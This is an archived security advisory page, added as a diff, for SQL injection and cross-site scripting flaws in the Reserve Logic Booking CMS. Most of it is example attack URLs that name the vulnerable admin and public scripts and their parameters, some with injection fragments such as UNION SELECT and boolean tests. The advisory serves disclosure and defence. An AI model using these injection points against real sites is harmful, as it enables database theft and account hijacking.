@@ -1,0 +1,93 @@
+#SpeeDr00t@Black Falcon<br>#bid54400<p><b><span style="font-size: 18pt;">Reserve Logic Booking CMS Multiple Input Validation Vulnerabilities</span></b></p><br><br><a href="http://www.securityfocus.com/bid/54400/info">info</a><br><a href="http://www.securityfocus.com/bid/54400/discuss">discussion</a><br><a href="http://www.securityfocus.com/bid/54400/exploit">exploit</a><br><a href="http://www.securityfocus.com/bid/54400/solution">solution</a><br><a href="http://www.securityfocus.com/bid/54400/references">references</a><br><br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+<table border="0" cellpadding="4" cellspacing="0">
+<tr>
+<td>
+<span class="label">Bugtraq ID:</span>
+</td>
+<td>
+				54400
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Class:</span>
+</td>
+<td>
+				Input Validation Error
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">CVE:</span>
+</td>
+<td>
+</td>
+</tr>
+<tr>
+<td>
+<span class="label">Remote:</span>
+</td>
+<td>
+				Yes
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Local:</span>
+</td>
+<td>
+				No
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Published:</span>
+</td>
+<td>
+				Jul 12 2012 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Updated:</span>
+</td>
+<td>
+				Jul 12 2012 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Credit:</span>
+</td>
+<td>
+				Ibrahim El-Sayed,Benjamin Kunz Mejri
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Vulnerable:</span>
+</td>
+<td>
+</td>
+</tr>
+<tr>
+<td colspan="2">
+<div class="breakline"></div>
+</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Not Vulnerable:</span>
+</td>
+<td>
+</td>
+</tr>
+</table>
+</div><br><br>#<br>##no_exploit_link<br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+	An attacker can exploit these issues through a browser.             <br/> <br/>The following example URLs are available:      <br/> <br/>http://www.example.com/reservelogic/PATH/packagedetails.php?pid=4+SQL-INJECTIONAND+substring(version(),1)=5      <br/> <br/>http://www.example.com/reservelogic/PATH/admin/booking_report.php?rghtMenu=rghtMenu3&amp;amp;SQL-INJECTIONUnion+select+1,2,3,4,5...30--%20-      <br/>0&amp;amp;sort=x&amp;amp;txtFromDate=x&amp;amp;txtToDate=x      <br/> <br/>http://www.example.com/reservelogic/PATH/admin/booking_report.php?rghtMenu=rghtMenu3&amp;amp;orderby=-1%27SQL-INJECTION      <br/>&amp;amp;sort=ASC&amp;amp;txtFromDate=05-17-2012&amp;amp;txtToDate=06-16-2012      <br/> <br/>http://www.example.com/reservelogic/PATH/admin/users_report.php?rghtMenu=rghtMenu3&amp;amp;orderby=SQL-INJECTIONdDatejoin      <br/>&amp;amp;sort=ASC&amp;amp;txtFromDate=05-17-2012&amp;amp;txtToDate=06-16-2012      <br/> <br/>http://www.example.com/reservelogic/PATH/packagedetails.php?pid=4+BLIND SQL-INJECTION      <br/> <br/>http://www.example.com/reservelogic/PATH/packagedetails.php?pid=4BLIND SQL-INJECTION      <br/>+AND+substring(version(),1)=5      <br/> <br/>http://www.example.com/reservelogic/PATH/admin/editenquiries.php?id=7BLIND SQL-INJECTION      <br/>&amp;amp;postsearch=S&amp;amp;cmbSearch=&amp;amp;page=1&amp;amp;txtkey=      <br/> <br/>http://www.example.com/reservelogic/PATH/admin/addclientlocations.php?id=23BLIND SQL-INJECTION      <br/> <br/>http://www.example.com/reservelogic/PATH/admin/addcustomers.php?id=65BLIND SQL-INJECTION      <br/> <br/>http://www.example.com/reservelogic/PATH/admin/addcustomers.php?id=65BLIND SQL-INJECTION      <br/>+AND+1=2&amp;amp;postsearch=S&amp;amp;cmbSearch=&amp;amp;page=1&amp;amp;txtkey=      <br/> <br/> <br/>http://www.example.com/reservelogic/PATH/admin/addpackages.php?id=5BLIND SQL-INJECTION      <br/> <br/>http://www.example.com/reservelogic/PATH/admin/addpackages.php?id=5+AND+1=2BLIND SQL-INJECTION      <br/>&amp;amp;postsearch=S&amp;amp;cmbSearch=&amp;amp;page=1&amp;amp;txtkey=      <br/> <br/> <br/>http://www.example.com/reservelogic/PATH/admin/addaccomtypeavailability.php?id=72BLIND SQL-INJECTION      <br/> <br/>http://www.example.com/reservelogic/PATH/admin/booking_report.php?rghtMenu=rghtMenu3&amp;amp;BLIND SQL-INJECTION      <br/>&amp;amp;sort=ASC&amp;amp;txtFromDate=x&amp;amp;txtToDate=x      <br/> <br/>http://www.example.com/reservelogic/PATH/admin/booking_report.php?rghtMenu=rghtMenu3&amp;amp;AND+1=1BLIND SQL-INJECTION      <br/>&amp;amp;sort=ASC&amp;amp;txtFromDate=x&amp;amp;txtToDate=x      <br/> <br/>http://www.example.com/reservelogic/PATH/admin/addspecialoffer.php?id=4BLIND SQL-INJECTION      <br/>&amp;amp;postsearch=S&amp;amp;cmbSearch=&amp;amp;page=1&amp;amp;txtkey=      <br/> <br/> <br/>http://www.example.com/reservelogic/PATH/admin/addspecialoffer.php?id=4'BLIND SQL-INJECTION      <br/>&amp;amp;postsearch=S&amp;amp;cmbSearch=&amp;amp;page=1&amp;amp;txtkey=      <br/> <br/>http://www.example.com/reservelogic/PATH/locationdetails.php?did=CROSS SITE SCRIPTING <br/> <br/>http://www.example.com/reservelogic/PATH/admin/bookings.php?page=CROSS SITE SCRIPTING <br/> <br/>http://www.example.com/reservelogic/PATH/admin/addpackages.php?id=5&amp;amp;postsearch=S&amp;amp;cmbSearch=&amp;amp;page=1&amp;amp;txtkey=CROSS SITE SCRIPTING <br/> <br/>http://www.example.com/reservelogic/PATH/admin/addpackages.php?id=5&amp;amp;postsearch=S&amp;amp;cmbSearch=&amp;amp;page=CROSS SITE SCRIPTING&amp;amp;txtkey= <br/> <br/>http://www.example.com/reservelogic/PATH/admin/addpackages.php?id=5&amp;amp;postsearch=S&amp;amp;cmbSearch=CROSS SITE SCRIPTING&amp;amp;page=1&amp;amp;txtkey= <br/> <br/>http://www.example.com/reservelogic/PATH/admin/addpackages.php?id=5&amp;amp;postsearch=CROSS SITE SCRIPTING&amp;amp;cmbSearch=&amp;amp;page=1&amp;amp;txtkey= <br/> <br/>http://www.example.com/reservelogic/PATH/admin/addpackages.php?id=CROSS SITE SCRIPTING <br/> <br/>http://www.example.com/reservelogic/PATH/admin/add_news.php?nid=CROSS SITE SCRIPTING&amp;amp;page=1 <br/> <br/>http://www.example.com/reservelogic/PATH/admin/addaccomtypeavailability.php?id=CROSS SITE SCRIPTING&amp;amp;postsearch=S&amp;amp;cmbSearch=&amp;amp;page=1&amp;amp;txtkey= <br/> <br/>http://www.example.com/reservelogic/PATH/admin/add_banner.php?nBId=CROSS SITE SCRIPTING&amp;amp;page=1 <br/> <br/>http://www.example.com/reservelogic/PATH/admin/editfeedback.php?id=CROSS SITE SCRIPTING&amp;amp;postsearch=S&amp;amp;cmbSearch=&amp;amp;page=1&amp;amp;txtkey=
+	
+		<ul>
+</ul>
+</div>
